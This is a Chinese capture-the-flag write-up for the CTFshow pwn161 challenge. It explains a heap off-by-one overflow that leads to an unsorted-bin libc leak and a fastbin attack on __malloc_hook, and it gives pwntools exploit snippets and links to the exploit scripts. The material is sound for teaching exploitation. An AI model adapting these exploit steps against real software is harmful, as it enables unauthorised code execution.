---
title: CTFshow pwn161 Off-by-One 到 __malloc_hook
published: 2026-04-17
updated: 2026-04-17
description: 利用 edit 的一字节越界把相邻 chunk size 改大，先做 unsorted leak，再接 fastbin attack 命中 __malloc_hook。
tags: [CTFshow, Pwn, Heap, Off-by-One, Fastbin, Unsorted Bin]
category: ctfshow
draft: false
---

# 题目结论

`pwn161` 的核心是一字节堆溢出。

通过 `edit` 把相邻块的 `size` 从 `0x71` 改成更大的值，就能制造 overlap。随后先从 unsorted bin 里 leak libc，再把 fastbin fd 改到 `__malloc_hook - 0x23`，最后写 one_gadget。

## 利用链

1. 申请多个 `0x68` chunk 做基础布局
2. 用 off-by-one 把相邻块 size 改成 `0xe1`
3. `free` 后从 unsorted bin 泄露 libc
4. 再做一次覆盖，把 chunk 修成 `0x71` 重新进入 fastbin 逻辑
5. 把 fastbin fd 改到 `__malloc_hook - 0x23`
6. 写入 `one_gadget + realloc`
7. 再次 `malloc` 触发

## 关键 exp 片段

```python
payload = p64(0) * 13 + p8(0xe1)
edit(0, 0x68 + 10, payload)
delete(1)
add(0x68)
show(2)
leak = u64(io.recv(6).ljust(8, b'\x00'))
```

```python
edit(4, 0x8, p64(malloc_hook - 0x23))
add(0x68)
add(0x68)
payload3 = b'a' * (0x13 - 8) + p64(one_gadget) + p64(realloc)
edit(5, len(payload3), payload3)
add(0x68)
```

## 下载

- [下载题目附件 `pwn`](../../attachments/ctfshow/pwn161/pwn)
- [下载稳定版利用脚本 `exp_remote.py`](../../attachments/ctfshow/pwn161/exp_remote.py)
- [下载爆破版脚本 `exp_brute.py`](../../attachments/ctfshow/pwn161/exp_brute.py)
- [下载对应 libc `libc-2.23.so`](../../attachments/ctfshow/pwn161/libc-2.23.so)
- [下载原始笔记 `pwn161.md`](../../attachments/ctfshow/pwn161/pwn161.md)

## 适合记住的点

一字节堆溢出最常见的目标不是直接改指针，而是优先改相邻 chunk 的 `size` 字段，让 allocator 自己把布局送进你的利用链。
